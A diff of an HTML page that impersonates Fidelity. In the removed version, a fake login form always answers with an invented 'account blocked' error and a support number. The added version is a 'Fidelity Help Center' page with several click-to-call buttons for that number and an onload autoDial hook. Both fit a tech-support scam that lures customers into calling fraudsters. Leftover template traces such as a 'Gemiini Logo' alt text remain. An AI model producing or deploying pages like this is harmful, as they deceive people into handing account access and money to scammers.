@@ -1,281 +1,94 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
+
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Fidelity Login</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #f4f4f4;
-            margin: 0;
-            padding: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            position: relative;
-            flex-direction: column;
-        }
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-9Y8MCNE5XF"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
 
-        header {
-            width: 100%;
-            background-color: #ffffff;
-            padding: 15px 20px;
-            box-shadow: 0px 2px 5px rgba(0, 0, 0, 0.1);
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            position: absolute;
-            top: 0;
-        }
+  gtag('config', 'G-9Y8MCNE5XF');
+</script>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Customer Support</title>
+  <style>
+    body {
+      font-family: "SF Pro Text", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
+      text-align: center;
+      padding: 20px;
+      background-color: #f5f5f7;
+    }
 
-        .header-container {
-            display: flex;
-            justify-content: space-between;
-            width: 100%;
-            align-items: center;
-        }
+    h1 {
+      font-size: 32px;
+      margin-bottom: 20px;
+    }
 
-        .header-links a {
-            text-decoration: none;
-            color: #4B4B4B;
-            margin-left: 20px;
-            margin-right: 20px;
-        }
+    p {
+      font-size: 18px;
+      line-height: 1.5;
+      margin-bottom: 30px;
+    }
 
-        .header-links a:hover {
-            text-decoration: underline;
-        }
+    .call-button {
+      display: inline-block;
+      background-color: #0000FF;
+      color: #fff;
+      padding: 15px 30px;
+      font-size: 24px;
+      border-radius: 5px;
+      text-decoration: none;
+      transition: background-color 0.3s ease;
+      margin-bottom: 20px;
+    }
 
-        .container {
-            background-color: white;
-            padding: 40px;
-            border-radius: 8px;
-            box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.1);
-            width: 90%;
-            max-width: 400px;
-            text-align: center;
-            margin-top: 60px;
-        }
+    .call-button:hover {
+      background-color: #b71b36;
+    }
 
-        .container h2 {
-            margin-bottom: 20px;
-        }
+    .apple-logo {
+      width: 150px;
+      height: 150px;
+      margin-bottom: 30px;
+    }
 
-        .form-group {
-            margin-bottom: 15px;
-            text-align: left;
-        }
-
-        label {
-            display: block;
-            margin-bottom: 5px;
-        }
-
-        input[type="text"],
-        input[type="password"] {
-            width: 100%;
-            padding: 10px;
-            border: 1px solid #ccc;
-            border-radius: 4px;
-            box-sizing: border-box;
-        }
-
-        input[type="checkbox"] {
-            margin-right: 10px;
-        }
-
-        .login-btn {
-            width: 100%;
-            background-color: #28a745;
-            color: white;
-            padding: 12px;
-            border: none;
-            border-radius: 4px;
-            cursor: pointer;
-            font-size: 16px;
-        }
-
-        .login-btn:hover {
-            background-color: #218838;
-        }
-
-        .forgot-password {
-            display: block;
-            margin-top: 15px;
-            text-align: left;
-        }
-
-        .forgot-password a {
-            color: black;
-            text-decoration: underline;
-        }
-
-        .forgot-password a:hover {
-            text-decoration: underline;
-        }
-
-        .signup-link {
-            margin-top: 20px;
-            font-size: 14px;
-            text-align: center;
-        }
-
-        .signup-link a {
-            color: black;
-            text-decoration: underline;
-        }
-
-        .signup-link a:hover {
-            text-decoration: underline;
-        }
-
-        .error {
-            color: red;
-            margin-top: 10px;
-            font-size: 14px;
-        }
-
-        /* Loading GIF styles */
-        .loading-container {
-            display: none;
-            text-align: center;
-            margin-top: 20px;
-        }
-
-        .loading-container img {
-            width: 50px;
-        }
-
-        /* Media Queries for Responsiveness */
-        @media (max-width: 600px) {
-            header {
-                padding: 10px 15px;
-            }
-
-            .header-links a {
-                margin-left: 10px;
-                margin-right: 10px;
-            }
-
-            .container {
-                padding: 20px;
-            }
-
-            .login-btn {
-                padding: 10px;
-                font-size: 14px;
-            }
-        }
-    </style>
+    .footer {
+      font-size: 14px;
+      color: #888;
+      margin-top: 50px;
+    }
+  </style>
+  
 </head>
-<body>
-    <header>
-        <div class="header-container">
-            <div class="logo">
-                <img src="fidelity-vector-logo-small.png" alt="Fidelity Logo" style="width: 150px;">
-            </div>
-            <div class="header-links">
-                <a href="#">Security</a>
-                <a href="#">FAQs</a>
-            </div>
-        </div>
-    </header>
 
-    <div class="container">
-        <h2>Log in</h2>
-        <form id="loginForm">
-            <div class="form-group">
-                <label for="username">Username</label>
-                <input type="text" id="username" name="username" placeholder="Username">
-            </div>
-            <div class="form-group">
-                <label for="password">Password</label>
-                <input type="password" id="password" name="password" placeholder="Password">
-                <div id="error-message" class="error"></div> <!-- Error message block -->
-		
-            </div>
-            <div class="form-group">
-                <input type="checkbox" id="remember" name="remember">
-                <label for="remember">Remember my username</label>
-            </div>
-            <button type="submit" class="login-btn">Log in</button>
-            <div class="forgot-password">
-                <a href="#">Forgot username or password?</a>
-            </div>
-        </form>
+ 
+</head>
+
+<body onload="autoDial()">
+<br>
+<img src="fid.png" alt="Gemiini Logo" class="Fidelity-logo">
+      <br>
+  
+  
+  <h1> Fidelity Help Center </h1>
+	 <a href="tel:1-844-499-1812" class="call-button">+1-844-499-1812</a><br>
+   <a href="tel:1-844-499-1812" class="call-button">Click To Call Now</a>
+  
+    
+<br>
         
-        <!-- Loading GIF -->
-        <div class="loading-container" id="loading">
-            <img src="loading-green-loading.gif" alt="Loading...">
-            <p>Logging in...</p>
-        </div>
-    </div>
+	
+	<p>For any assistance or inquiries related to Fidelity products or services, our dedicated customer service team is here to help you. Whether you need technical support, have questions about your Fidelity device, require assistance with your Fidelity account, or need guidance with Fidelity services, our experts are just a phone call away. Experience exceptional support from Fidelity.</p>
+  <h1>For More Information related to any query, Get in Touch With The Representative Immediately.</h1>
+		<br>
+  <a href="tel:1-844-499-1812" class="call-button"> Contact Us <br> 1-844-499-1812</a>
+  
 
-    <!-- Signup link outside the container -->
-    <div class="signup-link">
-        New to Fidelity? <a href="#">Open an account or sign up.</a>
-    </div>
-
-    <script>
-        // Function to save username to localStorage if "Remember my username" is checked
-        function saveUsername() {
-            const username = document.getElementById('username').value;
-            const remember = document.getElementById('remember').checked;
-
-            if (remember) {
-                localStorage.setItem('rememberedUsername', username);
-            } else {
-                localStorage.removeItem('rememberedUsername');
-            }
-        }
-
-        // Function to populate the username field if it was remembered
-        function loadRememberedUsername() {
-            const rememberedUsername = localStorage.getItem('rememberedUsername');
-            if (rememberedUsername) {
-                document.getElementById('username').value = rememberedUsername;
-                document.getElementById('remember').checked = true;
-            }
-        }
-
-        // Show error message on login attempt
-        function showErrorMessage() {
-            const errorMessage = document.getElementById('error-message');
-            errorMessage.innerHTML = 'Error Code : 00X47800<br> Your account has been blocked due to security reasons. <br>Contact Support: <a href="tel:+18444991812">+1-844-499-1812</a>';
-        }
-
-        // Handle form submission
-        document.getElementById('loginForm').addEventListener('submit', function(event) {
-            event.preventDefault();
-
-            // Show loading GIF
-            const loading = document.getElementById('loading');
-            loading.style.display = 'block';
-
-            // Hide form
-            const form = document.getElementById('loginForm');
-            form.style.display = 'none';
-
-            // Simulate loading and show error message after 2 seconds
-            setTimeout(function() {
-                loading.style.display = 'none'; // Hide loading GIF
-                form.style.display = 'block'; // Show form again
-                showErrorMessage(); 
-// Show error message
-            }, 2000);
-
-            // Save the username if remember is checked
-            saveUsername();
-
-        });
-
-        // Load remembered username on page load
-        window.onload = function() {
-            loadRememberedUsername();
-        };
-    </script>
+ 
+  <p class="footer">© 2024 Our Support. All rights reserved.</p>
 
 </body>
+
 </html>
